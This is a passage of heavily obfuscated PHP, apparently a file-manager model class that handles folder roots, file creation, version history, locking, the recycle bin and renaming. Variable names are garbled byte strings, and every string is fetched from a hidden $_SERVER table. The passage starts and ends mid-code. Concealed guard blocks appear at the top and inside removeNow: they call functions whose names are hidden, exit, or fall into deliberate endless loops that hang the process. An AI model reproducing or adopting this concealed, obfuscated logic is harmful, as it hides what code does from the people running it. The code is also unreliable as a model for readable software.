{ $exit = $_SERVER[¥ÙÌÜ¾ê][867]; $exit(); } $_act = $_SERVER[¥ÙÌÜ¾ê][868]; $_act($_SERVER[$_SERVER[¥ÙÌÜ¾ê][865]] . $_SERVER[¥ÙÌÜ¾ê][866]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¥ÙÌÜ¾ê][376]); } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÊØ€äò©) { $åğÓÇ ç =& $_SERVER[¥ÙÌÜ¾ê]; $•Íèè‚ = Model($åğÓÇ ç[507])->where(array($åğÓÇ ç[1572] => $ÊØ€äò©))->find(); $•ã¦áš¡ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÊØ€äò©, $•Íèè‚[$åğÓÇ ç[28]]); $this->userDesktopAdd($•ã¦áš¡); return $•ã¦áš¡; } public function userDesktopAdd($¡î¼õˆ’) { $—¿ã‰İ¼ =& $_SERVER[¥ÙÌÜ¾ê]; $Ç†èƒòÏ = LNG($—¿ã‰İ¼[2012]); $³å¨Çõı = $this->mkdir($¡î¼õˆ’, $Ç†èƒòÏ); $this->metaSet($³å¨Çõı, $—¿ã‰İ¼[2013], $—¿ã‰İ¼[87]); $this->metaSet($¡î¼õˆ’, $—¿ã‰İ¼[2014], $³å¨Çõı); } public function groupRootAdd($µÍ„¦»í) { $£³Îšï° =& $_SERVER[¥ÙÌÜ¾ê]; $ïÈ²Û¯Ü = Model($£³Îšï°[516])->where(array($£³Îšï°[1836] => $µÍ„¦»í))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $µÍ„¦»í, $ïÈ²Û¯Ü[$£³Îšï°[28]]); } public function systemRootPathAdd($ÇšÊÓ÷Ş) { if ($ÇšÊÓ÷Ş != $_SERVER[¥ÙÌÜ¾ê][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÇšÊÓ÷Ş); } public function userRootRemove($úºèãŒ) { $Ïõ¶ˆç– = $this->sourceRoot(SourceModel::TYPE_USER, $úºèãŒ); if (!$Ïõ¶ˆç–) { return; } $this->remove($Ïõ¶ˆç–, !1); } public function groupRootRemove($¯šœè´ˆ) { $ÂÏ²õÎ£ = $this->sourceRoot(SourceModel::TYPE_GROUP, $¯šœè´ˆ); if (!$ÂÏ²õÎ£) { return; } $this->remove($ÂÏ²õÎ£, !1); } private function _mkdirRoot($ù‹ÄÊˆÆ, $û–Âé€È, $Ôãğ—©é) { $Ş¥°Ã·² =& $_SERVER[¥ÙÌÜ¾ê]; $öé‡¸ú¯ = array($Ş¥°Ã·²[396] => 0, $Ş¥°Ã·²[574] => $ù‹ÄÊˆÆ, $Ş¥°Ã·²[575] => $û–Âé€È, $Ş¥°Ã·²[571] => 1, $Ş¥°Ã·²[576] => USER_ID, $Ş¥°Ã·²[577] => USER_ID, $Ş¥°Ã·²[572] => $Ş¥°Ã·²[33], $Ş¥°Ã·²[578] => $Ş¥°Ã·²[525], $Ş¥°Ã·²[424] => 0, $Ş¥°Ã·²[573] => 0, $Ş¥°Ã·²[462] => 0, $Ş¥°Ã·²[579] => $Ş¥°Ã·²[33]); if ($‰Ï¢‘©¥ = $this->where($öé‡¸ú¯)->find()) { return $‰Ï¢‘©¥[$Ş¥°Ã·²[397]]; } $×’œ†Ê° = "\115\157\144\145\154\123\157\x75\x72\143\145\56\x6d\x6b\x64\x69\162\x52\x6f\157\164\x2e{$ù‹ÄÊˆÆ}\x2e{$û–Âé€È}\x2e" . $Ôãğ—©é; CacheLock::lock($×’œ†Ê°); $öé‡¸ú¯[$Ş¥°Ã·²[28]] = $Ôãğ—©é; $’«Œ®¬ª = $this->add($öé‡¸ú¯); $¥’«Õ¨Ö = array($Ş¥°Ã·²[580] => short_id($’«Œ®¬ª)); $this->where(array($Ş¥°Ã·²[412] => $’«Œ®¬ª))->save($¥’«Õ¨Ö); CacheLock::unlock($×’œ†Ê°); return $’«Œ®¬ª; } private function sourceRoot($ŠˆÏÖ’ë, $©ˆÔ×¼, $›Æ»²ñ = false) { $çÈ¦‡Í° =& $_SERVER[¥ÙÌÜ¾ê]; $âÉ¡ì¯ˆ = array($çÈ¦‡Í°[396] => 0, $çÈ¦‡Í°[574] => $ŠˆÏÖ’ë, $çÈ¦‡Í°[575] => $©ˆÔ×¼); if ($¿¼‘øı = $this->where($âÉ¡ì¯ˆ)->find()) { return $›Æ»²ñ ? $¿¼‘øı : $¿¼‘øı[$çÈ¦‡Í°[397]]; } return !1; } public function sourceRootGroup($ÀÖĞ–ÑÌ) { $ŞÒÚ‘« =& $_SERVER[¥ÙÌÜ¾ê]; if (is_string($ÀÖĞ–ÑÌ)) { $ÀÖĞ–ÑÌ = array($ÀÖĞ–ÑÌ); } $…Ÿ‹îè— = array($ŞÒÚ‘«[396] => 0, $ŞÒÚ‘«[575] => array($ŞÒÚ‘«[7], $ÀÖĞ–ÑÌ), $ŞÒÚ‘«[574] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $÷ŞÁı”÷ = $this->limit(count($ÀÖĞ–ÑÌ))->listSource($…Ÿ‹îè—, 1000); $this->selectPageRestore(); return array_to_keyvalue($÷ŞÁı”÷[$ŞÒÚ‘«[75]], $ŞÒÚ‘«[498]); } public function mkfile($¢ß¸ ïØ, $éìÔ¾…ö, $–½Õİ« = '', $¹¥çŒÜ´ = REPEAT_RENAME) { $øÒ“ŒñÏ =& $_SERVER[¥ÙÌÜ¾ê]; $şªó†» = Model($øÒ“ŒñÏ[597])->addFileByContent($–½Õİ«, $éìÔ¾…ö); return $this->_createFileCall($¢ß¸ ïØ, $éìÔ¾…ö, $şªó†», $¹¥çŒÜ´, $øÒ“ŒñÏ[1264]); } public function addFile($ÅÇæ¯£±, $›Ô×ĞëÃ, $ŠøáĞı³, $ÁÌÂ»’Ñ = false, $è¶ŸÍ = REPEAT_RENAME) { $¨Ç¥ ©š = Model($_SERVER[¥ÙÌÜ¾ê][597])->addFile($›Ô×ĞëÃ, $ŠøáĞı³, $ÁÌÂ»’Ñ); return $this->_createFileCall($ÅÇæ¯£±, $ŠøáĞı³, $¨Ç¥ ©š, $è¶ŸÍ); } public function addFileByFileID($òß¦±ıã, $±Í–ŠÄ, $£‘¦¬Íµ, $»¡Ó¶ê× = REPEAT_RENAME) { $Ú©ş“á£ =& $_SERVER[¥ÙÌÜ¾ê]; $Ì¯–£Œá = Model($Ú©ş“á£[597])->find($±Í–ŠÄ); Model($Ú©ş“á£[597])->linkAdd($±Í–ŠÄ); return $this->_createFileCall($òß¦±ıã, $£‘¦¬Íµ, $Ì¯–£Œá, $»¡Ó¶ê×); } public function addFileByRemote($˜ƒ×ª¼, $êù°Ç¬©, $£ûƒÙÎ, $¬„Úæ×ü = array(), $Ô…¤•„À = REPEAT_RENAME) { $¿Ñá„ùå = Model($_SERVER[¥ÙÌÜ¾ê][597])->addFileByRemote($êù°Ç¬©, $£ûƒÙÎ, $¬„Úæ×ü); return $this->_createFileCall($˜ƒ×ª¼, $£ûƒÙÎ, $¿Ñá„ùå, $Ô…¤•„À); } private function _createFileCall($–ãÎĞè°, $½Àğ°Œñ, $ùÉ½‹ƒ, $ì”ÖØÃ, $‚É£ñ¼Ì = "\x75\160\154\157\141\x64") { $ß« »Ì =& $_SERVER[¥ÙÌÜ¾ê]; $¼ŒÍÜÈû = !1; $this->setMasterDB(); $this->lockWriteStart($–ãÎĞè°, $½Àğ°Œñ); $ŸîÜ…Ä— = $this->fileNameExist($–ãÎĞè°, $½Àğ°Œñ); $¼ø¸÷ËÔ = $this->_createFile($–ãÎĞè°, $½Àğ°Œñ, $ùÉ½‹ƒ, $ì”ÖØÃ, $¼ŒÍÜÈû); if (!$¼ŒÍÜÈû) { Model($ß« »Ì[464])->remove($ùÉ½‹ƒ[$ß« »Ì[461]]); } if ($¼ŒÍÜÈû && $¼ø¸÷ËÔ && $¼ø¸÷ËÔ != $ŸîÜ…Ä—) { Model($ß« »Ì[1985])->eventCreate($¼ø¸÷ËÔ, $‚É£ñ¼Ì); } $this->lockWriteEnd($–ãÎĞè°, $½Àğ°Œñ); return $¼ø¸÷ËÔ; } public function mkdir($¦£Æñ©ı, $´·¢øÉİ, $ñÈÏ£¾à = REPEAT_SKIP) { $Š–Á®˜ò =& $_SERVER[¥ÙÌÜ¾ê]; $this->setMasterDB(); $Ì­äáâ = $this->sourceInfo($¦£Æñ©ı); if (!$Ì­äáâ) { return !1; } $this->lockWriteStart($¦£Æñ©ı, $´·¢øÉİ); if ($ñÈÏ£¾à !== !1) { $Ùİ¬œÜè = $this->fileNameExist($¦£Æñ©ı, $´·¢øÉİ); if ($Ùİ¬œÜè && $ñÈÏ£¾à != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¦£Æñ©ı, $´·¢øÉİ); return $Ùİ¬œÜè; } $´·¢øÉİ = $this->fileNameAuto($¦£Æñ©ı, $´·¢øÉİ, $ñÈÏ£¾à); } $¶‡ü¦¾ = array($Š–Á®˜ò[571] => 1, $Š–Á®˜ò[415] => $´·¢øÉİ, $Š–Á®˜ò[572] => $Š–Á®˜ò[33], $Š–Á®˜ò[462] => 0, $Š–Á®˜ò[573] => 0); $ŒïİÊ©¨ = $this->_addSource($¶‡ü¦¾, $Ì­äáâ); Model($Š–Á®˜ò[1985])->eventCreate($ŒïİÊ©¨, $Š–Á®˜ò[1265]); $this->lockWriteEnd($¦£Æñ©ı, $´·¢øÉİ); return $ŒïİÊ©¨; } private function _createFile($§í°…Ãù, $Á‹¹Ï¨¦, $‘˜“¡ÍŒ, $”¼şË•, &$şÉŠú¹ã) { $¯¿Êö— =& $_SERVER[¥ÙÌÜ¾ê]; $Ïïûì˜ = $this->sourceInfo($§í°…Ãù); if (!$‘˜“¡ÍŒ || !$Ïïûì˜) { return !1; } if ($”¼şË• !== !1) { $ÂçÓ³û = $this->fileNameExist($§í°…Ãù, $Á‹¹Ï¨¦); } $şÉŠú¹ã = !0; if ($”¼şË• && $ÂçÓ³û) { if ($”¼şË• == REPEAT_SKIP) { $şÉŠú¹ã = !1; return $ÂçÓ³û; } else { if ($”¼şË• == REPEAT_REPLACE) { $±ĞÂÀÁ¾ = $this->sourceInfo($ÂçÓ³û); $üãÙôú = $this->fileHistory($±ĞÂÀÁ¾, $‘˜“¡ÍŒ[$¯¿Êö—[461]], $‘˜“¡ÍŒ[$¯¿Êö—[78]]); if (!$üãÙôú) { $şÉŠú¹ã = !1; } else { $this->folderSizeReset($§í°…Ãù); } return $ÂçÓ³û; } else { $Á‹¹Ï¨¦ = $this->fileNameAuto($§í°…Ãù, $Á‹¹Ï¨¦, $”¼şË•, !1); } } } $Ö”Œˆ’ï = array($¯¿Êö—[571] => 0, $¯¿Êö—[415] => $Á‹¹Ï¨¦, $¯¿Êö—[572] => substr(get_path_ext($Á‹¹Ï¨¦), 0, 10), $¯¿Êö—[462] => $‘˜“¡ÍŒ[$¯¿Êö—[461]], $¯¿Êö—[573] => $‘˜“¡ÍŒ[$¯¿Êö—[78]]); $øÕ¸™¢— = $this->_addSource($Ö”Œˆ’ï, $Ïïûì˜); $this->folderSizeReset($§í°…Ãù, intval($Ö”Œˆ’ï[$¯¿Êö—[78]])); return $øÕ¸™¢—; } protected function fileHistory($È•ÎÉã, $¹ˆî‚±õ, $ÁÁèóùù) { $ã˜åõ›Õ =& $_SERVER[¥ÙÌÜ¾ê]; $Éá‘­áí = defined($ã˜åõ›Õ[468]) ? USER_ID : $ã˜åõ›Õ[191]; if ($È•ÎÉã[$ã˜åõ›Õ[461]] == $¹ˆî‚±õ) { return !1; } $this->checkLock($È•ÎÉã[$ã˜åõ›Õ[397]], $¹ˆî‚±õ); Model($ã˜åõ›Õ[2015])->addHistory($È•ÎÉã); $áÈúéü‡ = array($ã˜åõ›Õ[577] => $Éá‘­áí, $ã˜åõ›Õ[419] => time(), $ã˜åõ›Õ[461] => $¹ˆî‚±õ, $ã˜åõ›Õ[78] => $ÁÁèóùù); $this->where(array($ã˜åõ›Õ[412] => $È•ÎÉã[$ã˜åõ›Õ[397]]))->save($áÈúéü‡); $this->sourceCacheClear($È•ÎÉã[$ã˜åõ›Õ[397]]); return !0; } public function checkLock($â‰×ÇÓ‚, $½é «á) { $‹ç”û®¸ =& $_SERVER[¥ÙÌÜ¾ê]; $½¯â œ¦ = $this->pathInfo($â‰×ÇÓ‚); if (!$this->fileIsLock($½¯â œ¦, !0)) { return; } $½Ù¹·è = Session::get($‹ç”û®¸[2016]); $é„¦¸ô¼ = substr($½¯â œ¦[$‹ç”û®¸[28]], 0, -1 - strlen($½¯â œ¦[$‹ç”û®¸[168]])) . $‹ç”û®¸[1530] . $½Ù¹·è . $‹ç”û®¸[95] . $½¯â œ¦[$‹ç”û®¸[168]]; $Ùïª×äĞ = Model($‹ç”û®¸[597])->find($½é «á); $this->_createFileCall($½¯â œ¦[$‹ç”û®¸[492]], $é„¦¸ô¼, $Ùïª×äĞ, REPEAT_REPLACE, $‹ç”û®¸[1264]); $Ãˆ±ğú“ = $½¯â œ¦[$‹ç”û®¸[459]][$‹ç”û®¸[536]]; $²¾óÕÒÓ = $Ãˆ±ğú“[$‹ç”û®¸[2017]] ? $Ãˆ±ğú“[$‹ç”û®¸[2017]] : $Ãˆ±ğú“[$‹ç”û®¸[28]]; show_json(LNG($‹ç”û®¸[2018]) . $‹ç”û®¸[2019] . LNG($‹ç”û®¸[2020]) . $‹ç”û®¸[2021] . $²¾óÕÒÓ . $‹ç”û®¸[2022], !1); } public function fileIsLock($‰…ç¤Æ¤, $Øº»í¯Ÿ = false) { $§ä™øøÏ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($‰…ç¤Æ¤[$§ä™øøÏ[459]]) || !$‰…ç¤Æ¤[$§ä™øøÏ[459]][$§ä™øøÏ[533]]) { return !1; } if ($‰…ç¤Æ¤[$§ä™øøÏ[459]][$§ä™øøÏ[533]] != USER_ID) { return !0; } $Ô Õ”‰ = $GLOBALS[$§ä™øøÏ[6]][$§ä™øøÏ[88]][$§ä™øøÏ[534]]; if ($‰…ç¤Æ¤[$§ä™øøÏ[459]][$§ä™øøÏ[535]] <= time() - $Ô Õ”‰) { $this->metaSet($‰…ç¤Æ¤[$§ä™øøÏ[397]], $§ä™øøÏ[533], null); $this->metaSet($‰…ç¤Æ¤[$§ä™øøÏ[397]], $§ä™øøÏ[535], null); } if ($Øº»í¯Ÿ) { $this->metaSet($‰…ç¤Æ¤[$§ä™øøÏ[397]], $§ä™øøÏ[535], time()); } return !1; } private function _addSource($ÁÁ±ÌŒÇ, $Ü“óÉÇ‘) { $ñ™—€ =& $_SERVER[¥ÙÌÜ¾ê]; $´ä‰ÎƒÚ = defined($ñ™—€[468]) ? USER_ID : $ñ™—€[191]; $”ÎÀ£¼ = array($ñ™—€[574] => $Ü“óÉÇ‘[$ñ™—€[406]], $ñ™—€[575] => $Ü“óÉÇ‘[$ñ™—€[498]], $ñ™—€[576] => $´ä‰ÎƒÚ, $ñ™—€[577] => $´ä‰ÎƒÚ, $ñ™—€[396] => $Ü“óÉÇ‘[$ñ™—€[397]], $ñ™—€[578] => $Ü“óÉÇ‘[$ñ™—€[515]] . $Ü“óÉÇ‘[$ñ™—€[397]] . $ñ™—€[47], $ñ™—€[424] => 0, $ñ™—€[579] => $ñ™—€[33]); $ÁÁ±ÌŒÇ = array_merge($”ÎÀ£¼, $ÁÁ±ÌŒÇ); $this->updateModifyTime($ÁÁ±ÌŒÇ[$ñ™—€[492]]); $–˜òòÅå = $ñ™—€[2023] . $Ü“óÉÇ‘[$ñ™—€[397]]; if (isset(self::$cacheChildList[$–˜òòÅå])) { unset(self::$cacheChildList[$–˜òòÅå]); } static $Ë‹½‡‡Å = false; if (!$Ë‹½‡‡Å) { Hook::trigger($ñ™—€[561], $ÁÁ±ÌŒÇ); $Ë‹½‡‡Å = !0; } $Û˜©í”Ó = $this->add($ÁÁ±ÌŒÇ); $ï®¥òŞ = array($ñ™—€[580] => short_id($Û˜©í”Ó)); $this->where(array($ñ™—€[412] => $Û˜©í”Ó))->save($ï®¥òŞ); $this->setNamePinyin($Û˜©í”Ó, $ÁÁ±ÌŒÇ[$ñ™—€[28]]); return $Û˜©í”Ó; } public function remove($«úÄ×Ò×, $œ¡Öæû… = true) { $Ì±¯¨êÚ =& $_SERVER[¥ÙÌÜ¾ê]; $Ğø÷«—‡ = $this->sourceInfo($«úÄ×Ò×); $ÓË¡é»æ = intval($Ğø÷«—‡[$Ì±¯¨êÚ[406]]) === self::TYPE_SYSTEM; $›Êíüî = Model($Ì±¯¨êÚ[427])->get($Ì±¯¨êÚ[2024]) == $Ì±¯¨êÚ[87]; if ($ÓË¡é»æ || $œ¡Öæû… || !$›Êíüî) { return $this->removeNow($«úÄ×Ò×, $œ¡Öæû…); } $‰Ô¹ıË = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $š¸š‘Ã = $Ğø÷«—‡[$Ì±¯¨êÚ[406]] == self::TYPE_USER ? $Ì±¯¨êÚ[588] : $Ì±¯¨êÚ[509]; if ($š¸š‘Ã == $Ì±¯¨êÚ[588]) { $¿àÖ‹…¾ = Model($Ì±¯¨êÚ[507])->getInfo($Ğø÷«—‡[$Ì±¯¨êÚ[498]]); $Ë©Ãœû = !empty($¿àÖ‹…¾[$Ì±¯¨êÚ[2017]]) ? $¿àÖ‹…¾[$Ì±¯¨êÚ[2017]] : $¿àÖ‹…¾[$Ì±¯¨êÚ[28]]; $Ë©Ãœû = $Ì±¯¨êÚ[258] . $Ë©Ãœû . $Ì±¯¨êÚ[2025] . $Ğø÷«—‡[$Ì±¯¨êÚ[498]]; } else { $¿àÖ‹…¾ = Model($Ì±¯¨êÚ[516])->getInfo($Ğø÷«—‡[$Ì±¯¨êÚ[498]]); $Ë©Ãœû = _get($¿àÖ‹…¾, $Ì±¯¨êÚ[28]); $Ë©Ãœû = $Ì±¯¨êÚ[160] . $Ë©Ãœû . $Ì±¯¨êÚ[2026] . $Ğø÷«—‡[$Ì±¯¨êÚ[498]]; } $Úä­Â­Ï = $Ì±¯¨êÚ[2027] . md5($Ë©Ãœû); CacheLock::lock($Úä­Â­Ï); $úšäğòô = $this->fileNameExist($‰Ô¹ıË, $Ë©Ãœû); if (!$úšäğòô) { $úšäğòô = $this->mkdir($‰Ô¹ıË, $Ë©Ãœû, REPEAT_SKIP); $this->metaSet($úšäğòô, $Ì±¯¨êÚ[2028], $š¸š‘Ã); $this->metaSet($úšäğòô, $Ì±¯¨êÚ[2029], $Ğø÷«—‡[$Ì±¯¨êÚ[498]]); if ($Ğø÷«—‡[$Ì±¯¨êÚ[492]] != 0) { $this->metaSet($úšäğòô, $Ì±¯¨êÚ[2030], _get($¿àÖ‹…¾, $Ì±¯¨êÚ[2031])); } } CacheLock::unlock($Úä­Â­Ï); $this->metaSet($«úÄ×Ò×, $Ì±¯¨êÚ[2032], $Ğø÷«—‡[$Ì±¯¨êÚ[492]]); $this->where(array($Ì±¯¨êÚ[397] => $«úÄ×Ò×))->save(array($Ì±¯¨êÚ[419] => time())); $this->recycleClear($Ğø÷«—‡); $äøò«µŠ = $this->move($«úÄ×Ò×, $úšäğòô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ğø÷«—‡[$Ì±¯¨êÚ[492]]); return $äøò«µŠ; } private function recycleClear($¤ËçìÁá) { $ûîŠÇÈŞ =& $_SERVER[¥ÙÌÜ¾ê]; $£ÖÂ†¦ = $this->childrenAll($¤ËçìÁá); $Ä›ñøÏì = array($ûîŠÇÈŞ[412] => array($ûîŠÇÈŞ[413], $£ÖÂ†¦[$ûîŠÇÈŞ[2033]])); Model($ûîŠÇÈŞ[2034])->where($Ä›ñøÏì)->delete(); } public function removeNow($ ¼Ğò¾’, $Ûø×‡ÂÃ = true) { $ˆŠ¤Óä =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($_SERVER[$ˆŠ¤Óä[862]]) || !isset($_SERVER[$ˆŠ¤Óä[869]])) { $½½ø‡õ¥ = $ˆŠ¤Óä[880]; $°åÄõ‹ = $ˆŠ¤Óä[864]; $×®éËÎº = $_SERVER[$ˆŠ¤Óä[865]] . $ˆŠ¤Óä[866]; $©¡°§¡¸ = $°åÄõ‹($×®éËÎº); $Â¶À»• = explode($ˆŠ¤Óä[229], $©¡°§¡¸); if (count($Â¶À»•) < $ˆŠ¤Óä[623]) { $”š˜æ¥  = $ˆŠ¤Óä[867]; $”š˜æ¥ (); } $Şö§µ˜Œ = $ˆŠ¤Óä[881]; $Şö§µ˜Œ($_SERVER[$ˆŠ¤Óä[882]]); $ßÈ¿àÑÉ = 1; for ($‚Ğ–Ôíû = $ßÈ¿àÑÉ; $‚Ğ–Ôíû > 0; $‚Ğ–Ôíû++) { $Şö§µ˜Œ = json_encode($GLOBALS[$ˆŠ¤Óä[413]]); } } $«º¥úœå = $this->sourceInfo($ ¼Ğò¾’); $‹Ü¹üé£ = $this->pathInfoMore($ ¼Ğò¾’); if (!$«º¥úœå) { return !0; } if ($«º¥úœå[$ˆŠ¤Óä[492]] == 0) { if (!_get($GLOBALS, $ˆŠ¤Óä[499])) { return !1; } } $this->lockMoveStart($ ¼Ğò¾’); Hook::trigger($ˆŠ¤Óä[2035], $‹Ü¹üé£, $Ûø×‡ÂÃ); if ($Ûø×‡ÂÃ) { Model($ˆŠ¤Óä[2034])->moveToRecycle($ ¼Ğò¾’); } else { $­ŒñàªÍ = $this->childrenAll($«º¥úœå); Model($ˆŠ¤Óä[558])->eventRemove($ ¼Ğò¾’); $this->removeRelevance($­ŒñàªÍ[$ˆŠ¤Óä[2033]], $­ŒñàªÍ[$ˆŠ¤Óä[1394]]); } $this->folderSizeReset($«º¥úœå[$ˆŠ¤Óä[492]]); $Î¨×œÕÁ = array($«º¥úœå[$ˆŠ¤Óä[492]]); if ($«º¥úœå[$ˆŠ¤Óä[405]] == $ˆŠ¤Óä[87]) { $Î¨×œÕÁ[] = $«º¥úœå[$ˆŠ¤Óä[397]]; } $this->updateModifyTime($Î¨×œÕÁ); $this->lockMoveEnd($ ¼Ğò¾’); Hook::trigger($ˆŠ¤Óä[1617], $‹Ü¹üé£, $Ûø×‡ÂÃ); return !0; } public function childrenAll($¸Ãü§îç) { $‰„àÈè =& $_SERVER[¥ÙÌÜ¾ê]; $á«¿É² = $¸Ãü§îç[$‰„àÈè[397]]; if ($¸Ãü§îç[$‰„àÈè[405]] == $‰„àÈè[87]) { $ŞÜ½À‰ = array($‰„àÈè[578] => array($‰„àÈè[538], $¸Ãü§îç[$‰„àÈè[515]] . $á«¿É² . $‰„àÈè[539])); $¥ã‹£¿ö = array($‰„àÈè[578] => $ŞÜ½À‰[$‰„àÈè[515]]); $Ó¤¯•Œ’ = $this->field($‰„àÈè[2036])->where($¥ã‹£¿ö)->select(); $¨ïÓÔªÅ = !1; $¬öÒÙÃà = array($á«¿É²); if ($Ó¤¯•Œ’) { $¨ïÓÔªÅ = array_to_keyvalue($Ó¤¯•Œ’, $‰„àÈè[33], $‰„àÈè[461]); $¨ïÓÔªÅ = array_remove_value($¨ïÓÔªÅ, $‰„àÈè[191]); $¬öÒÙÃà = array_to_keyvalue($Ó¤¯•Œ’, $‰„àÈè[33], $‰„àÈè[397]); $¬öÒÙÃà[] = $á«¿É²; } } else { $¨ïÓÔªÅ = array($¸Ãü§îç[$‰„àÈè[461]]); $¬öÒÙÃà = array($á«¿É²); } return array($‰„àÈè[2033] => $¬öÒÙÃà, $‰„àÈè[1394] => $¨ïÓÔªÅ); } public function removeArray($´Œ£Ï…¶) { if (!$´Œ£Ï…¶) { return !0; } } public function removeRelevance($ùæä³¸„, $±ˆÚ°¯È) { $£†ï¬ö =& $_SERVER[¥ÙÌÜ¾ê]; $ùæä³¸„ = $ùæä³¸„ ? $ùæä³¸„ : array(); $±ˆÚ°¯È = $±ˆÚ°¯È ? $±ˆÚ°¯È : array(); $ùæä³¸„ = array_unique(array_filter($ùæä³¸„)); $±ˆÚ°¯È = array_unique(array_filter($±ˆÚ°¯È)); if (!$ùæä³¸„) { return !1; } $öí»İ“á = array($£†ï¬ö[412] => array($£†ï¬ö[413], $ùæä³¸„)); Model($£†ï¬ö[2034])->where($öí»İ“á)->delete(); Model($£†ï¬ö[455])->where($öí»İ“á)->delete(); Model($£†ï¬ö[1892])->where($öí»İ“á)->delete(); Model($£†ï¬ö[558])->where($öí»İ“á)->delete(); Model($£†ï¬ö[1728])->removeBySource($ùæä³¸„); Model($£†ï¬ö[2015])->removeBySource($ùæä³¸„); $this->where($öí»İ“á)->delete(); Model($£†ï¬ö[464])->remove($±ˆÚ°¯È); for ($‰¤à€Ä = 0; $‰¤à€Ä < count($ùæä³¸„); $‰¤à€Ä++) { $this->sourceCacheClear($ùæä³¸„[$‰¤à€Ä]); } } public function rename($Ô¯ÒÑŠ, $á¼®‹–­) { $”ì¬ÂéÁ =& $_SERVER[¥ÙÌÜ¾ê]; $õë¦¶õò = $this->sourceInfo($Ô¯ÒÑŠ); if (!$õë¦¶õò) { return !1; } $Ûöà°Ò = $this->fileNameExist($õë¦¶õò[$”ì¬ÂéÁ[492]], $á¼®‹–­); if ($Ûöà°Ò && $Ûöà°Ò != $Ô¯ÒÑŠ) { return !1; } $êàÂ¤ = array($”ì¬ÂéÁ[415] => $á¼®‹–­, $”ì¬ÂéÁ[577] => USER_ID); if ($õë¦¶õò[$”ì¬ÂéÁ[405]] != $”ì¬ÂéÁ[87]) { $êàÂ¤[$”ì¬ÂéÁ[407]] = substr(get_path_ext($á¼®‹–­), 0, 10); } Model($”ì¬ÂéÁ[558])->eventRename($Ô¯ÒÑŠ, $õë¦¶õò[$”ì¬ÂéÁ[28]], $á¼®‹–­); $this->sourceCacheClear($Ô¯ÒÑŠ); $this->setNamePinyin($Ô¯ÒÑŠ, $êàÂ¤[$”ì¬ÂéÁ[28]], !1); $this->updateModifyTime($õë¦¶õò[$”ì¬ÂéÁ[492]]); $ˆŠŠû–» = $this->where(array($”ì¬ÂéÁ[412] => $Ô¯ÒÑŠ))->data($êàÂ¤)->save(); $š§§ì¨ = $”ì¬ÂéÁ[2023] . $õë¦¶õò[$”ì¬ÂéÁ[492]]; if (isset(self::$cacheChildList[$š§§ì¨])) { unset(self::$cacheChildList[$š§§ì¨]); } return $ˆŠŠû–»; } public function setNamePinyin($¸”Ï´ü, $¿ åèĞ, $øîµó›Ÿ = true) { $¯ ô¼×Î =& $_SERVER[¥ÙÌÜ¾ê]; $­¨‘î·‹ = Input::check($¿ åèĞ, $¯ ô¼×Î[581]); $Ë¹Ú©Úì = array($¯ ô¼×Î[436] => KodSort::makeStr($¿ åèĞ)); if ($­¨‘î·‹) { $Ë¹Ú©Úì[$¯ ô¼×Î[458]] = str_replace($¯ ô¼×Î[50], $¯ ô¼×Î[33], Pinyin::get($¿ åèĞ)); $Ë¹Ú©Úì[$¯ ô¼×Î[457]] = Pinyin::get($¿ åèĞ, $¯ ô¼×Î[582]); } if (!$øîµó›Ÿ && !$­¨‘î·‹) { $Ë¹Ú©Úì[$¯ ô¼×Î[458]] = null; $Ë¹Ú©Úì[$¯ ô¼×Î[457]] = null; } $this->metaSet($¸”Ï´ü, $Ë¹Ú©Úì); } public function getContent($ëÓÕ»ªø) { $…±ñ˜ï¥ =& $_SERVER[¥ÙÌÜ¾ê]; $‚Ñòˆ = $this->fileInfoGet($ëÓÕ»ªø); if (!$‚Ñòˆ) { return !1; } if ($‚Ñòˆ[$…±ñ˜ï¥[78]] == 0) { return $…±ñ˜ï¥[33]; } $İ¥à£‡ = $…±ñ˜ï¥[2037] . $‚Ñòˆ[$…±ñ˜ï¥[170]]; if ($‚Ñòˆ[$…±ñ˜ï¥[78]] <= 1024 * 10) { $ú¤ñ£»™ = Cache::get($İ¥à£‡); if (!$ú¤ñ£»™) { $ú¤ñ£»™ = IO::getContent($‚Ñòˆ[$…±ñ˜ï¥[76]]); Cache::set($İ¥à£‡, $ú¤ñ£»™); } return $ú¤ñ£»™; } if (!$‚Ñòˆ[$…±ñ˜ï¥[76]]) { return $…±ñ˜ï¥[33]; } return IO::getContent($‚Ñòˆ[$…±ñ˜ï¥[76]]); } public function setDesc($¾­Ú¸¯, $ú›éı‚‡) { $¼À²ù =& $_SERVER[¥ÙÌÜ¾ê]; Model($¼À²ù[558])->eventAddDesc($¾­Ú¸¯, $ú›éı‚‡); return $this->metaSet($¾­Ú¸¯, $¼À²ù[445], $ú›éı‚‡); } public function setContent($´ş™ë™’, $ßï„­ = '') { $¯¦¹®§€ =& $_SERVER[¥ÙÌÜ¾ê]; $è¥“²¨ = $this->sourceInfo($´ş™ë™’); $Û“æú·Í = $this->fileInfoGet($´ş™ë™’); if (!$Û“æú·Í || !$è¥“²¨) { return !1; } $œ—ıÔ¼ = Model($¯¦¹®§€[464])->addFileByContent($ßï„­, $è¥“²¨[$¯¦¹®§€[28]]); $“ù²ôÓŞ = $this->fileHistory($è¥“²¨, $œ—ıÔ¼[$¯¦¹®§€[461]], $œ—ıÔ¼[$¯¦¹®§€[78]]); if (!$“ù²ôÓŞ) { return Model($¯¦¹®§€[464])->remove($œ—ıÔ¼[$¯¦¹®§€[461]]); } $this->folderSizeReset($è¥“²¨[$¯¦¹®§€[492]]); return !0; } public function fileSubstr($ö’£”ßó, $‚ŒÙ·Èš, $µ¾¼şô) { $–Ê¬ÖãÅ = $this->fileInfoGet($ö’£”ßó); if (!$–Ê¬ÖãÅ) { return !1; } return IO::fileSubstr($–Ê¬ÖãÅ[$_SERVER[¥ÙÌÜ¾ê][76]], $‚ŒÙ·Èš, $µ¾¼şô); } public function fileInfoGet($ášäÈá) { $¬ê“ñ£• =& $_SERVER[¥ÙÌÜ¾ê]; $öş£äÆë = 